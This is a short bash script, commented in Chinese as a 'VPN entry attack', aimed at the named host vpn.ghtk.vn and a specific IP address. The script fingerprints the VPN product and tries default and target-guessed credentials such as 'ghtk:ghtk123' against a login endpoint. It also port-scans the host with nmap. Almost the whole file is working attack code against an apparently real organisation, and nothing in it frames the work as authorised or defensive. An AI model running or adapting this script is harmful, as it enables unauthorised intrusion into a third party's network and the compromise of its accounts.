#!/bin/bash
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 VPN入口攻击：vpn.ghtk.vn"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

TARGET="vpn.ghtk.vn"
IP="35.221.247.80"

echo "[*] 基本信息"
curl -sI "https://$TARGET" -m 5 | head -15

echo ""
echo "[*] 识别VPN类型"
resp=$(curl -sk "https://$TARGET" -m 5)
echo "$resp" | head -50

# 检测VPN指纹
if echo "$resp" | grep -qi "fortigate"; then
    echo "  ✅ FortiGate VPN检测到！"
    VPN_TYPE="fortigate"
elif echo "$resp" | grep -qi "pulse secure"; then
    echo "  ✅ Pulse Secure VPN检测到！"
    VPN_TYPE="pulse"
elif echo "$resp" | grep -qi "cisco"; then
    echo "  ✅ Cisco VPN检测到！"
    VPN_TYPE="cisco"
elif echo "$resp" | grep -qi "palo alto"; then
    echo "  ✅ Palo Alto VPN检测到！"
    VPN_TYPE="paloalto"
elif echo "$resp" | grep -qi "openvpn"; then
    echo "  ✅ OpenVPN检测到！"
    VPN_TYPE="openvpn"
fi

echo ""
echo "[*] 测试默认凭据"
DEFAULT_CREDS=(
    "admin:admin"
    "admin:password"
    "admin:Admin123"
    "ghtk:ghtk123"
)

for cred in "${DEFAULT_CREDS[@]}"; do
    user=$(echo $cred | cut -d':' -f1)
    pass=$(echo $cred | cut -d':' -f2)
    echo "  尝试: $user:$pass"
    
    resp=$(curl -sk "https://$TARGET/api/v1/auth" -X POST \
        -d "username=$user&password=$pass" -m 3 2>&1)
    echo "$resp" | grep -qiE "success|token|session" && echo "    ⚠️  可能成功！"
done

echo ""
echo "[*] 端口扫描 - $IP"
nmap -p 22,443,1194,8443,10443 $IP 2>/dev/null | grep -E "^[0-9]+"

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
